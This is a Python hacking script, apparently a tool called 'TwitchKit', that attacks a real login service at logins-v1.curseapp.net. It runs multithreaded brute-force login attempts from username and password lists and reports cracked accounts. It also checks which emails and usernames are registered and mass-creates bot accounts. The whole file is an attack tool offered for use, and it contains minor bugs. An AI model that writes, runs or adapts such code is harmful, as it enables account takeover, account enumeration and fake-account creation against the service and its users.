#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests,re,threading,platform,os,sys,time,warnings
warnings.filterwarnings('ignore')
def login(us3rname,passw0rd):
	r1 = requests.post('https://logins-v1.curseapp.net/login',data={'Username':us3rname,'Password':passw0rd}).text
	if '"Status": 1,' in r1:
		print("\tCracked -> ("+us3rname+":"+passw0rd+") !......\n")
	else:
		print("("+us3rname+":"+passw0rd+") is Incorrect\n")
def checker(type,usr,mil):
	if type == 'email':
		r2 = requests.post('https://logins-v1.curseapp.net/register',data={'Username':usr,'Password':'testtest','Email':mil}).text
		if '"StatusMessage":"EmailInUse"' in r2:
			print("("+mil+") is Taken\n")
		else:
			print("\t("+mil+") is Avilable\n")
	else:
		h = {'Content-Type':'application/json; charset=UTF-8'}
		r3 = requests.post('https://logins-v1.curseapp.net/register/check-username',headers=h ,data='"'+usr+'"').text
		if 'false' in r3:
			print("("+usr+") is Taken\n")
		else:
			print("("+usr+") is Avilable\n")
def creator():
	int1 = str(int(time.time()))
	bot1 = "x"+int1+"x"
	int2 = str(int(time.time()))
	bot2 = "x"+int1+"x"
	int3 = str(int(time.time()))
	bot3 = 'x'+int1+'x@gmail.com'
	r4 = requests.post('https://logins-v1.curseapp.net/register',data={'Username':bot1,'Password':bot2,'Email':bot3}).text
	if '"UserID"' in r4:
		print('{"username":"'+bot1+'","password":"'+bot2+'","email":"'+bot3+'"}')
	else:
		print('{"status":"error"}')
if __name__ == "__main__":
	syst3m = platform.system()
	if 'Linux' in syst3m:
		os.system('clear')
	if 'Windows' in syst3m:
		os.system('cls')
	print(u'''
	[CoDeD By 1337r00t] -> (Twitter:(@_1337r00t))
	
████████╗██╗    ██╗██╗████████╗ ██████╗██╗  ██╗ ██╗  ██╗██╗████████╗
╚══██╔══╝██║    ██║██║╚══██╔══╝██╔════╝██║  ██║ ██║ ██╔╝██║╚══██╔══╝
   ██║   ██║ █╗ ██║██║   ██║   ██║     ███████║-█████╔╝ ██║   ██║   
   ██║   ██║███╗██║██║   ██║   ██║     ██╔══██║ ██╔═██╗ ██║   ██║   
   ██║   ╚███╔███╔╝██║   ██║   ╚██████╗██║  ██║ ██║  ██╗██║   ██║   
   ╚═╝    ╚══╝╚══╝ ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝ ╚═╝  ╚═╝╚═╝   ╚═╝ v1.2
                                                                   ''')
	version = re.findall(r'^[\w\.-]', platform.python_version())
	if '2' in version:
		do = raw_input('''
		Choose any number ?
		1 - Brute Force
		2 - Checker (Usernames-Emails)
		3 - Creator [Bot]
		> ''')
	if '3' in version:
		do = str(input('''
		Choose any number ?
		1 - Brute Force
		2 - Checker (Usernames-Emails)
		3 - Creator [Bot]
		> '''))
	############
	if do == '1':
		if '2' in version:
			bfu = raw_input("List Of Usernames => ")
			bfp = raw_input("List Of Passwords => ")
		if '3' in version:
			bfu = str(input("List Of Usernames => "))
			bfp = str(input("List Of Passwords => "))
		bf_u = open(bfu,'r').read().splitlines()
		bf_p = open(bfp,'r').read().splitlines()
		thread_pool3 = []
		for u in bf_u:
			for p in bf_p:
				thread3 = threading.Thread(target=login, args=(u,p,))
				thread_pool3.append(thread3)
				thread3.start()
		for thread3 in thread_pool3:
			thread3.join()
	############
	if do == '2':
		if '2' in version:
			do_check = raw_input('''
			Choose any number ?
			1 - Checker [Emails]
			2 - Checker [Usernames]
			> ''')
		if '3' in version:
			do_check = raw_input('''
			Choose any number ?
			1 - Brute Force
			2 - Checker
			> ''')
		if do_check == '1':
			if '2' in version:
				email_list = raw_input("List Of Emails => ")
			if '3' in version:
				email_list = str(input("List Of Emails => "))
			emails = open(email_list,'r').read().splitlines()
			thread_pool1 = []
			for email in emails:
				thread1 = threading.Thread(target=checker, args=('email','test',email,))
				thread_pool1.append(thread1)
				thread1.start()
			for thread1 in thread_pool1:
				thread1.join()
		if do_check == '2':
			if '2' in version:
				user_list = raw_input("List Of Usernames => ")
			if '3' in version:
				user_list = str(input("List Of Usernames => "))
			us3rs = open(user_list,'r').read().splitlines()
			thread_pool2 = []
			for user in us3rs:
				thread2 = threading.Thread(target=checker, args=('user',user,'f@f.com',))
				thread_pool2.append(thread2)
				thread2.start()
			for thread2 in thread_pool2:
				thread2.join()
	########
	if do == '3':
		creator()
